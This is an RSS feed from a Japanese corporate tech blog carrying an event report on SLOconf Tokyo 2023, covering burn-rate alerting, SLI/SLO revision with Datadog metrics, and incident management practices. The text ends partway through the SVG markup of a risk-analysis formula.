<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"
  xmlns:atom="http://www.w3.org/2005/Atom"
  xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>フューチャー技術ブログ</title>
    <link>https://future-architect.github.io/</link>
    
    <image>
      <url>https://future-architect.github.io/feed_icon.png</url>
      <title>フューチャー技術ブログ</title>
      <link>https://future-architect.github.io/</link>
    </image>
    
    <atom:link href="https://future-architect.github.io/rss2.xml" rel="self" type="application/rss+xml"/>
    
    <description>フューチャーの開発者による公式技術ブログです。業務で利用している技術を幅広く紹介します。</description>
    <pubDate>Thu, 18 May 2023 07:57:09 GMT</pubDate>
    <generator>http://hexo.io/</generator>
    
    <item>
      <title>SLOconf Tokyo 2023というコミュニティイベントに参加しました</title>
      <link>https://future-architect.github.io/articles/20230518b/</link>
      <guid>https://future-architect.github.io/articles/20230518b/</guid>
      <pubDate>Wed, 17 May 2023 15:00:01 GMT</pubDate>
      
        
        
          
          
      <description>&lt;h2 id=&quot;はじめに&quot;&gt;&lt;a href=&quot;#はじめに&quot; class=&quot;headerlink&quot;</description>
          
        
      
      
      
      <content:encoded><![CDATA[<h2 id="はじめに"><a href="#はじめに" class="headerlink" title="はじめに"></a>はじめに</h2><p>こんにちは、TIGの原木です。</p><p>SLOconfという、Nobl9社が主催する、サービスレベル目標（SLO）に特化したカンファレンスがあります。今までオンラインでやってきたのですが、三回目になる今回、初めてオフラインで開催&amp;世界各地でローカルなコミュニティイベントを同時開催する運びになりました。</p><p>日本ではGoogleJapanさんが手を挙げて、Googleの渋谷オフィスで2023/5/13日に、<a href="https://connpass.com/event/282120/">SLOconf Tokyo 2023</a>として開催されました。</p><p>SLOに関する興味深い話を数多く視聴できたので、イベントレポートとして記録に残したいと存じます。</p><h2 id="当日のセッションリスト"><a href="#当日のセッションリスト" class="headerlink" title="当日のセッションリスト"></a>当日のセッションリスト</h2><div class="scroll"><table><thead><tr><th>No</th><th>タイトル</th><th>スピーカー</th></tr></thead><tbody><tr><td>1</td><td>How I learned to stop worrying and love burn rates</td><td>Ashley Chen</td></tr><tr><td>2</td><td>スタディサプリにおける SLI/SLO の継続的改善</td><td>@chaspy_</td></tr><tr><td>3</td><td>SLOを満たせなくなったら</td><td>Shunji Kawabata</td></tr><tr><td>4</td><td>LuupにおけるSLOの物語</td><td>@gr1m0h</td></tr></tbody></table></div><p>他、DatadogのToby Burressさんによる<a href="https://www.youtube.com/watch?v=wiirb2skqtI"><code>What we mean by 'Mean'</code></a> (平均が意味するものは？)のパブリックビューイングも予定されていましたが、時間の関係でなくなりました。</p><h2 id="SLOconf-2023-How-I-learned-to-stop-worrying-and-love-burn-rates"><a href="#SLOconf-2023-How-I-learned-to-stop-worrying-and-love-burn-rates" class="headerlink" title="SLOconf 2023 - How I learned to stop worrying and love burn rates"></a>SLOconf 2023 - How I learned to stop worrying and love burn rates</h2><p>動画: <a href="https://www.youtube.com/watch?v=ra0cCmEVKS8">https://www.youtube.com/watch?v=ra0cCmEVKS8</a></p><h3 id="話された内容"><a href="#話された内容" class="headerlink" title="話された内容"></a>話された内容</h3><p>DataDogのSLOチームで働いているAshley Chenさんに、閾値からバーンレートにインシデントの検知方法を変えた場合にどのようなメリットがあるのかお話いただきました。</p><p>運用監視通知システムのロジックを、「閾値を使ったシンプルな通知システム(Simple Threshold alert)」から「バーンレートを用いた通知システム(Burn Rate alert)」に置き換えてみたら…</p><ol><li>インシデントの検知対象は変わるのだろうか？</li><li>paging数(システムから運用者への警告/通知数)に変化はあるのだろうか？</li></ol><p>…ということについて、六か月にわたって実際のサービスメトリクスに基づいて両方のタイプのアラートをトリガーすることで実験したそうです。</p><div class="note info" style="background: #e5f8e2; padding:16px; margin:24px 12px; border-radius:8px;">  <span class="fa fa-fw fa-check-circle"></span><p>バーンレートとは、SREのエラーバジェット(障害に対してどこまで許容していいかという予算)の消化率を表したものです。一般にはバーンレートが高い場合、障害によるユーザーへの影響が大きいことを示します。</p></div><p>その実験結果として、</p><ul><li>インシデントの種類によってバーンレートアラートの発火は変わる<ul><li>インシデントの種類は4種類に分類できる<ol><li>既知のインシデント<ol><li>既知のインシデントとは、アラートを受け取ったとき、既に上流で別のシステムが既にインシデントを認知、対応中であるようなケースのこと</li></ol></li><li>依存関係にある周辺システムへのスケールアップの要求</li><li>不明</li><li>フレイキーページ(Flaky Page)<ol><li>フレイキーページとはアラート後、数分して勝手に復旧するようなケース</li></ol></li></ol></li></ul></li><li>既知のインシデントの場合はバーンレートは高くなるが、それ以外のケースはそれほどでもない</li><li>手動アクションの介入が最も必要なのは既知のインシデントの場合である</li></ul><p>結果として「閾値を使ったシンプルな通知システム」と比較して、「バーンレートを用いた通知システム」ではユーザーのページ数を42ページも減らすことができると実験結果で得られました。</p><div class="note info" style="background: #e5f8e2; padding:16px; margin:24px 12px; border-radius:8px;">  <span class="fa fa-fw fa-check-circle"></span><p>ページ(Page)とは、運用監視の文脈ではシステムからエンジニアやオペレーターへの警告または通知を指します。○○ページ減ったというのは、つまり運用者への警告数を減らせたことを意味します。</p><p>携帯電話が普及するより前、ポケベルという小型無線通信機が良く使われていました。英語名をPagerといいます。現代でも<a href="https://dailyportalz.jp/kiji/pokeberu-kongo-katsuyaku">業務用として急患などの緊急通知で病院にいない医者の呼び出しをする等の用途で現役らしい</a>です。IT業界ではSaaSのPagerDuty等にその名残があります。</p></div><h3 id="感想"><a href="#感想" class="headerlink" title="感想"></a>感想</h3><p>Flaky(フレイキー)という馴染みがあまりない用語を知ったのは、Jenkinsの作者である川口さんがソフトウェアのテストで「Flaky test」について解説した下記の記事でした。</p><p><a href="https://www.publickey1.jp/blog/22/itjenkinsdevops_days_tokyo_2022_1.html">https://www.publickey1.jp/blog/22/itjenkinsdevops_days_tokyo_2022_1.html</a></p><p>この記事には、フレイキーテストという、原因ははっきりしないのにたまに失敗するテストケースに振り回される開発者が出てきます。</p><p>これは何もテストだけに限った話ではなく、運用の場でも同様な事象が起こります。現代のサービスを支えるシステムは、Kubernetesに代表されるようにある程度のレジリエンシーを備えており、一瞬エラーイベントが発火しても数分したら回復していることも少なくありません。後述するセッション「SLOを満たせなくなったら」でもShunji Kawabataさんが強調していましたが、そのような一過性のイベントで開発者を呼び出した場合、呼び出された人には今しかかっている仕事を切り替えなくてはならない認知負荷を与えます。</p><p>もちろん、エラーイベントを生じさせているのは潜在的なバグである可能性が十分にあります。しかし、そのバグは、今しかかっている機能開発を止めてまで障害解決と対策に全力でリソースを入れなくちゃいけないものなのか、それともエラーバジェットの範囲内だといったんエラーイベントを許容できるレベルなのか。</p><p>そのバランスを保つために、開発者には適切なレベルでエラー通知を送るための材料として非常に説得力がある内容でした。</p><h2 id="スタディサプリにおけるSLI-x2F-SLOによる継続的な改善-をこれからやっていくぞという話"><a href="#スタディサプリにおけるSLI-x2F-SLOによる継続的な改善-をこれからやっていくぞという話" class="headerlink" title="スタディサプリにおけるSLI/SLOによる継続的な改善(をこれからやっていくぞという話)"></a>スタディサプリにおけるSLI/SLOによる継続的な改善(をこれからやっていくぞという話)</h2><p>スライド資料: <a href="https://speakerdeck.com/chaspy/slo-at-studysapuri">https://speakerdeck.com/chaspy/slo-at-studysapuri</a></p><h3 id="話された内容-1"><a href="#話された内容-1" class="headerlink" title="話された内容"></a>話された内容</h3><p>小学生から大学生までの学習を支援するサービス「スタディサプリ」でアプリケーション開発を行っているChaspyさんに、今関わっている「スタディサプリ 中学講座」にSLI/SLOで運用してみた苦い体験談について語っていただきました。</p><p>「スタディサプリ 中学講座」は2022年2月にリリースされました。順調にサービスは稼働し、リリース時に設定したSLI/SLOのモニタリング項目も遠い記憶となった一年後….ある時、SLO Alertが一度も鳴ったことがないという衝撃的な事実が発覚しました。</p><p>APMサービスであるSentryのExceptionAlertは飛んでいました。つまり、アプリケーションエラーが今まで起きたことが一度もないわけではありません。それなのに、SLO Alertは鳴ってないのはどうしてだろう？その理由について深堀してみたら数々の不具合が見つかりました。</p><p>最終的にはSLI/SLOに関して下記の見直しを実施しました。</p><ul><li>サービス間通信で利用していたGraphQLでエラーが生じた場合にhttpステータスを明示的に5xxで返すようにする</li><li>マイクロサービス間のメトリクスを取得するためだけに入れていたプロキシサーバーのEnvoyをやめて、代わりにDatadog APM metricsを導入</li><li>Datadog APM metricsに合わせた、メトリクスの取得方法やSLOの算出方法の変更</li><li>エラーイベント発生時の対応のドキュメント化</li></ul><h3 id="感想-1"><a href="#感想-1" class="headerlink" title="感想"></a>感想</h3><p>今回SLOconfを主催したNobl9のAlex Hidalgoさんが書いた「Implementing Service Level Objectives」(サービスレベル目標の実装)という書籍があります。</p><p>SLOの実装というタイトルの通り、SLOに関する実践情報がこれでもかと詰まった本ですが、その中でも好きなところが、第3部「SLOの文化」第14章「SLO Evolution(SLOの進化)」です。</p><p>サービスは時間経過に伴い様々な要因で変化し、当然、その際にSLOも変えていかなければなりません。SLI/SLOは定期的に見直さなくてはいけないねという話は、運用監視に携わる方ならよく聞く話だと思うのですが、ではどういったイベントが発生したらSLOを変えていかなければならないんだろうっていうことに踏み込んで説明した資料は少ないと思います。本誌を読んだとき、生命保険を見直すライフイベントに関するノウハウ本を読んでいるような錯覚を覚えました。</p><p>僭越ながら本書の日本語訳がもっと早く出ていればChaspyさんも…と思わずにはいられません。</p><p>本講演について、技術的には、Datadog APM metricsの”癖”に関して運用した知見に関する話が興味深く、実際に運用してフィードバックを得る良さを学びました。</p><p>Datadogのメトリクスの1つに、httpリクエストのエラー件数をカウントする <code>trace.http.request.errors</code> という指標があります。名前からこれで十分な気がしますが、実際は4xxのみカウントする(5xxは該当しない)指標でした…という登壇者の説明に、視聴者から「え、そうなの?」という反応が見て取れて面白かったです。</p><p>統合ログ管理ツールであるSplunkでエンジニアとして働いているKazunori Otaniさんが、こういう意図ではないか？とSlackで補足されていましたので引用します。</p><blockquote><p>Client - Serverの通信で、両者にAPMエージェントがセットアップされているとして、</p><ul><li>4xxの場合はClient側でエラーとして、Server側ではエラーとしてカウントしない</li><li>5xxの場合は、Server側でエラーとして、Client側ではエラーとしてカウントしない</li></ul><p>みたいな世界観なのかなと思いましたーが、これでうまく行かないことも多いので、難しい<br>Otelエージェント(注: OpenTelemetryのこと)では、Server側として、4xx, 5xx両方ともerror扱いとしてるはずですね</p></blockquote><h2 id="SLOを満たせなくなったら"><a href="#SLOを満たせなくなったら" class="headerlink" title="SLOを満たせなくなったら"></a>SLOを満たせなくなったら</h2><p>資料非公開</p><h3 id="話された内容-2"><a href="#話された内容-2" class="headerlink" title="話された内容"></a>話された内容</h3><p>Google Cloudの大規模ユーザー向けに、信頼性向上やパフォーマンスチューニング等の支援業務を行っているShunji Kawabataさんからは、「SLOを満たせなくなったら」というタイトルで、主にインシデント管理に関して語っていただきました。</p><p>SLOを満たせない状況の大半は、インシデント、つまり予期しない問題や障害が発生することに起因します。したがって、インシデントについての正確な理解や予防措置、対策をしっかり行えば、SLOを満たせない状況を回避することができます。</p><p>そもそも、SLOに対するインシデントの影響が小さくなったことはどのように判断すれば良いでしょうか？</p><img src="/images/20230518b/図1_インシデントとSLOの関係図.png" alt="図1_インシデントとSLOの関係図" width="1200" height="438" loading="lazy"><p>上記の図はインシデントとSLOの関係について説明したものです。インシデントの発生によるSLIの減少を最小限に抑えるためには、横軸が時間、縦軸がSLIを表すこの図の面積を小さくする必要があります。つまり、時間軸（横軸）とSLI軸（縦軸）のいずれかを縮小する必要があります。</p><p>時間軸については、「<strong>問題の検出時間</strong>」（ETTD: Estimated Time to Detect）と「<strong>問題の回復時間</strong>」（ETTR: Estimated Time to Recovery）を短縮することが求められます。一方、SLI軸では、<strong>「影響を受けたユーザー数」や「エラーの発生率」などのインパクト</strong>を最小限に抑えることが重要です。</p><p>また、インシデントの発生頻度を管理することも重要で、これは「<strong>次の障害発生までの時間</strong>」（ETTF: Extended Time to Fail）を長くすることで達成可能です。</p><p>これらの4つの要素を適切にコントロールするためにはどうすればいいでしょうか？</p><ul><li><strong>問題の検出時間(ETTD)を短くする</strong><ul><li>監視業務の自動化が鍵</li><li>運用者が日常的に見ている情報を文書化することでアラートポリシーやプログラムの材料とする</li></ul></li><li><strong>よくやる対処策は自動化し、なるべく人手を要らないようにする</strong><ul><li>運用者の呼び出しは、人間にコンテキストスイッチを要求する負荷の高い行為なので最終手段とする</li></ul></li><li><strong>復旧時間を(ETTR)を短くする</strong><ul><li>統制とプレビューが鍵</li><li>Googleはフラットな組織だが、インシデント対応に関しては完全なボトムアップ型の組織アプローチであるインシデントコマンドシステムを採用し、対応している<ul><li>参考: GoogleCloudドキュメント「<a href="https://cloud.google.com/docs/security/incident-response?hl=ja">データ インシデント対応プロセス</a>」</li></ul></li></ul></li><li><strong>インシデントを未然に防ぎ、ETTFを長くする</strong><ul><li>事後対応としてポストモーテムを実施する</li><li>Googleではインシデントの7割はシステムの変更時に発生しているのでカナリアリリースやプログレッシブロールアウト(段階的なデプロイ作業)といったリリース戦略を実行する<ul><li>参考: GoogleCloudドキュメント「<a href="https://cloud.google.com/deploy/docs/deployment-strategies/canary?hl=ja">カナリア デプロイ戦略を使用する</a>」</li></ul></li></ul></li><li><strong>事前準備をしっかり行う</strong><ul><li>インシデント対応ポリシーを策定する<ul><li>コミュニケーションチャンネルを用意する</li><li>作業時間のリミットと引継ぎ方法を事前に検討することで、インシデント発生時に対応者が長時間拘束されることを防ぐ</li></ul></li></ul></li><li><strong>暫定復旧の基準点を決める</strong><ul><li>SLOと同じ指標にしてしまうと往々にして困ることがあるので、長期的復旧とは指標を別にする</li></ul></li></ul><div class="note info" style="background: #e5f8e2; padding:16px; margin:24px 12px; border-radius:8px;">  <span class="fa fa-fw fa-check-circle"></span><p>講演者から、極端な例だけど…と、データセンター火災とSLOの関係について、閑話休題的に説明があったのですが、非常にインパクトがありました。</p><p>先月、パリのGoogleCloudデータセンターの1つ、europe-west9 リージョンが豪雨に見舞われました。多大な雨量が地下室のバッテリー室に流れ込んだ結果、火災が発生し、現状でも完全には回復には至っていません。<br><a href="https://www.theregister.com/2023/05/10/google_cloud_paris_outage_persists/">https://www.theregister.com/2023/05/10/google_cloud_paris_outage_persists/</a></p><p>上記のようなまれによくある事態が発生すると、顧客にはリージョンのお引越しをお願いすることになります。ですが、リージョンを移動した後でも移動前と全く同じ環境かというと、細かい差異が出てくることもあるそうです。</p><p>この状況下ではいつまでもSLOを満たせず、暫定対応から中長期的な改善対応(データセンターの再建等)へのシフトチェンジを行えません。</p><p>したがって、暫定復旧と長期的復旧の指標は別にした方がよいでしょう、との結論でした。</p></div><ul><li><p><strong>ポストモーテムを行い、失敗を学習、修正し、次に繋げる</strong></p><ul><li>インシデントを解決した後はポストモーテム(振り返り)を実施し、その内容を共有する</li><li>共有作業を単なる公開処刑としないためには、<strong>心理的安全性の確保</strong>が欠かせない</li><li>心理的バイアスがあることを認知し、改善していくことで、失敗を学習、修正し、次につなげる行動は生まれる<ul><li>参考: 「 <a href="https://www.oreilly.co.jp/books/9784873119137/">サイトリライアビリティワークブック ―SREの実践方法</a>」第10章 ポストモーテムの文化：失敗からの学び</li></ul></li></ul></li><li><p><strong>リスク分析を行う</strong></p><ul><li>「発生確率・影響度マトリックス」は、人間が正しくリスク判断できない恐れがあるのでお勧めしていない</li><li>代わりに「Net Error Budget Impact」という指標を使ってリスク評価する<ul><li>参考: 「<a href="https://cloud.google.com/blog/ja/products/devops-sre/how-sres-analyze-risks-to-evaluate-slos?hl=ja">その SLO は現実的ですか？SRE 的なリスク分析手法</a>」</li></ul></li><li>この計算式に紐づいて <a href="https://goo.gl/bnsPj7">CRE Risk Analysis Template</a> でリスク分析をすると客観的な数値を計算できる</li><li>Net Error Budget Impactの計算式</li></ul><p>  <mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -1.552ex;" xmlns="http://www.w3.org/2000/svg" width="35.752ex" height="4.855ex" role="img" focusable="false" viewBox="0 -1460 15802.3 2146"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mfrac"><g data-mml-node="mrow" transform="translate(220,710)"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(389,0)"><path data-c="1D438" d="M492 213Q472 213 472 226Q472 230 477 250T482 285Q482 316 461 323T364 330H312Q311 328 277 192T243 52Q243 48 254 48T334 46Q428 46 458 48T518 61Q567 77 599 117T670 248Q680 270 683 272Q690 274 698 274Q718 274 718 261Q613 7 608 2Q605 0 322 0H133Q31 0 31 11Q31 13 34 25Q38 41 42 43T65 46Q92 46 125 49Q139 52 144 61Q146 66 215 342T285 622Q285 629 281 629Q273 632 228 634H197Q191 640 191 642T193 659Q197 676 203 680H757Q764 676 764 669Q764 664 751 557T737 447Q735 440 717 440H705Q698 445 698 453L701 476Q704 500 704 528Q704 558 697 578T678 609T643 625T596 632T532 634H485Q397 633 392 631Q388 629 386 622Q385 619 355 499T324 377Q347 376 372 376H398Q464 376 489 391T534 472Q538 488 540 490T557 493Q562 493 565 493T570 492T572 491T574 487T577 483L544 351Q511 218 508 216Q505 213 492 213Z"></path></g><g data-mml-node="mi" transform="translate(1153,0)"><path data-c="1D447" d="M40 437Q21 437 21 445Q21 450 37 501T71 602L88 651Q93 669 101 677H569H659Q691 677 697 676T704 667Q704 661 687 553T668 444Q668 437 649 437Q640 437 637 437T631 442L629 445Q629 451 635 490T641 551Q641 586 628 604T573 629Q568 630 515 631Q469 631 457 630T439 622Q438 621 368 343T298 60Q298 48 386 46Q418 46 427 45T436 36Q436 31 433 22Q429 4 424 1L422 0Q419 0 415 0Q410 0 363 1T228 2Q99 2 64 0H49Q43 6 43 9T45 27Q49 40 55 46H83H94Q174 46 189 55Q190 56 191 56Q196 59 201 76T241 233Q258 301 269 344Q339 619 339 625Q339 630 310 630H279Q212 630 191 624Q146 614 121 583T67 467Q60 445 57 441T43 437H40Z"></path></g><g data-mml-node="mi" transform="translate(1857,0)"><path data-c="1D447" d="M40 437Q21 437 21 445Q21 450 37 501T71 602L88 651Q93 669 101 677H569H659Q691 677 697 676T704 667Q704 661 687 553T668 444Q668 437 649 437Q640 437 637 437T631 442L629 445Q629 451 635 490T641 551Q641 586 628 604T573 629Q568 630 515 631Q469 631 457 630T439 622Q438 621 368 343T298 60Q298 48 386 46Q418 46 427 45T436 36Q436 31 433 22Q429 4 424 1L422 0Q419 0 415 0Q410 0 363 1T228 2Q99 2 64 0H49Q43 6 43 9T45 27Q49 40 55 46H83H94Q174 46 189 55Q190 56 191 56Q196 59 201 76T241 233Q258 301 269 344Q339 619 339 625Q339 630 310 630H279Q212 630 191 624Q146 614 121 583T67 467Q60 445 57 441T43 437H40Z"></path></g><g data-mml-node="mi" transform="translate(2561,0)"><path data-c="1D437" d="M287 628Q287 635 230 637Q207 637 200 638T193 647Q193 655 197 667T204 682Q206 683 403 683Q570 682 590 682T630 676Q702 659 752 597T803 431Q803 275 696 151T444 3L430 1L236 0H125H72Q48 0 41 2T33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM703 469Q703 507 692 537T666 584T629 613T590 629T555 636Q553 636 541 636T512 636T479 637H436Q392 637 386 627Q384 623 313 339T242 52Q242 48 253 48T330 47Q335 47 349 47T373 46Q499 46 581 128Q617 164 640 212T683 339T703 469Z"></path></g><g data-mml-node="mo" transform="translate(3611.2,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mi" transform="translate(4611.4,0)"><path data-c="1D438" d="M492 213Q472 213 472 226Q472 230 477 250T482 285Q482 316 461 323T364 330H312Q311 328 277 192T243 52Q243 48 254 48T334 46Q428 46 458 48T518 61Q567 77 599 117T670 248Q680 270 683 272Q690 274 698 274Q718 274 718 261Q613 7 608 2Q605 0 322 0H133Q31 0 31 11Q31 13 34 25Q38 41 42 43T65 46Q92 46 125 49Q139 52 144 61Q146 66 215 342T285 622Q285 629 281 629Q273 632 228 634H197Q191 640 191 642T193 659Q197 676 203 680H757Q764 676 764 669Q764 664 751 557T737 447Q735 440 717 440H705Q698 445 698 453L701 476Q704 500 704 528Q704 558 697 578T678 609T643 625T596 632T532 634H485Q397 633 392 631Q388 629 386 622Q385 619 355 499T324 377Q347 376 372 376H398Q464 376 489 391T534 472Q538 488 540 490T557 493Q562 493 565 493T570 492T572 491T574 487T577 483L544 351Q511 218 508 216Q505 213 492 213Z"></path></g><g data-mml-node="mi" transform="translate(5375.4,0)"><path data-c="1D447" d="M40 437Q21 437 21 445Q21 450 37 501T71 602L88 651Q93 669 101 677H569H659Q691 677 697 676T704 667Q704 661 687 553T668 444Q668 437 649 437Q640 437 637 437T631 442L629 445Q629 451 635 490T641 551Q641 586 628 604T573 629Q568 630 515 631Q469 631 457 630T439 622Q438 621 368 343T298 60Q298 48 386 46Q418 46 427 45T436 36Q436 31 433 22Q429 4 424 1L422 0Q419 0 415 0Q410 0 363 1T228 2Q99 2 64 0H49Q43 6 43 9T45 27Q49 40 55 46H83H94Q174 46 189 55Q190 56 191 56Q196 59 201 76T241 233Q258 301 269 344Q339 619 339 625Q339 630 310 630H279Q212 630 191 624Q146 614 121 583T67 467Q60 445 57 441T43 437H40Z"></path></g><g data-mml-node="mi" transform="translate(6079.4,0)"><path data-c="1D447" d="M40 437Q21 437 21 445Q21 450 37 501T71 602L88 651Q93 669 101 677H569H659Q691 677 697 676T704 667Q704 661 687 553T668 444Q668 437 649 437Q640 437 637 437T631 442L629 445Q629 451 635 490T641 551Q641 586 628 604T573 629Q568 630 515 631Q469 631 457 630T439 622Q438 621 368 343T298 60Q298 48 386 46Q418 46 427 45T436 36Q436 31 433 22Q429 4 424 1L422 0Q419 0 415 0Q410 0 363 1T228 2Q99 2 64 0H49Q43 6 43 9T45 27Q49 40 55 46H83H94Q174 46 189 55Q190 56 191 56Q196 59 201 76T241 233Q258 301 269 344Q339 619 339 625Q339 630 310 630H279Q212 630 191 624Q146 614 121 583T67 467Q60 445 57 441T43 437H40Z"></path></g><g data-mml-node="mi" transform="translate(6783.4,0)"><path data-c="1D445" d="M230 637Q203 637 198 638T193 649Q193 676 204 682Q206 683 378 683Q550 682 564 680Q620 672 658 652T712 606T733 563T739 529Q739 484 710 445T643 385T576 351T538 338L545 333Q612 295 612 223Q612 212 607 162T602 80V71Q602 53 603 43T614 25T640 16Q668 16 686 38T712 85Q717 99 720 102T735 105Q755 105 755 93Q755 75 731 36Q693 -21 641 -21H632Q571 -21 531 4T487 82Q487 109 502 166T517 239Q517 290 474 313Q459 320 449 321T378 323H309L277 193Q244 61 244 59Q244 55 245 54T252 50T269 48T302 46H333Q339 38 339 37T336 19Q332 6 326 0H311Q275 2 180 2Q146 2 117 2T71 2T50 1Q33 1 33 10Q33 12 36 24Q41 43 46 45Q50 46 61 46H67Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628Q287 635 230 637ZM630 554Q630 586 609 608T523 636Q521 636 500 636T462 637H440Q393 637 386 627Q385 624 352 494T319 361Q319 360 388 360Q466 361 492 367Q556 377 592 426Q608 449 619 486T630 554Z"></path></g><g data-mml-node="mo" transform="translate(7542.4,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(8153.7,0)"><path data-c="22C5" d="M78 250Q78 274 95 292T138 310Q162 310 180 294T199 251Q199 226 182 208T139 190T96 207T78 250Z"></path></g><g data-mml-node="mi" transform="translate(8653.9,0)"><path data-c="1D43C" d="M43 1Q26 1 26 10Q26 12 29 24Q34 43 39 45Q42 46 54 46H60Q120 46 136 53Q137 53 138 54Q143 56 149 77T198 273Q210 318 216 344Q286 624 286 626Q284 630 284 631Q274 637 213 637H193Q184 643 189 662Q193 677 195 680T209 683H213Q285 681 359 681Q481 681 487 683H497Q504 676 504 672T501 655T494 639Q491 637 471 637Q440 637 407 634Q393 631 388 623Q381 609 337 432Q326 385 315 341Q245 65 245 59Q245 52 255 50T307 46H339Q345 38 345 37T342 19Q338 6 332 0H316Q279 2 179 2Q143 2 113 2T65 2T43 1Z"></path></g><g data-mml-node="mi" transform="translate(9157.9,0)"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(10035.9,0)"><path data-c="1D45D" d="M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z"></path></g><g data-mml-node="mi" transform="translate(10538.9,0)"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g><g data-mml-node="mi" transform="translate(11067.9,0)"><path data-c="1D450" d="M34 159Q34 268 120 355T306 442Q362 442 394 418T427 355Q427 326 408 306T360 285Q341 285 330 295T319 325T330 359T352 380T366 386H367Q367 388 361 392T340 400T306 404Q276 404 249 390Q228 381 206 359Q162 315 142 235T121 119Q121 73 147 50Q169 26 205 26H209Q321 26 394 111Q403 121 406 121Q410 121 419 112T429 98T420 83T391 55T346 25T282 0T202 -11Q127 -11 81 37T34 159Z"></path></g><g data-mml-node="mi" transform="translate(11500.9,0)"><path data-c="1D461" d="M26 385Q19 392 19 395Q19 399 22 411T27 425Q29 430 36 430T87 431H140L159 511Q162 522 166 540T173 566T179 586T187 603T197 615T211 624T229 626Q247 625 254 615T261 596Q261 589 252 549T232 470L222 433Q222 431 272 431H323Q330 424 330 420Q330 398 317 385H210L174 240Q135 80 135 68Q135 26 162 26Q197 26 230 60T283 144Q285 150 288 151T303 153H307Q322 153 322 145Q322 142 319 133Q314 117 301 95T267 48T216 6T155 -11Q125 -11 98 4T59 56Q57 64 57 83V101L92 241Q127 382 128 383Q128 385 77 385H26Z"></path></g><g data-mml-node="mo" transform="translate(12084.1,0)"><path data-c="22C5" d="M78 250Q78 274 95 292T138 310Q162 310 180 294T199 251Q199 226 182 208T139 190T96 207T78 250Z"></path></g><g data-mml-node="mn" transform="translate(12584.3,0)"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path><path data-c="36" d="M42 313Q42 476 123 571T303 666Q372 666 402 630T432 550Q432 525 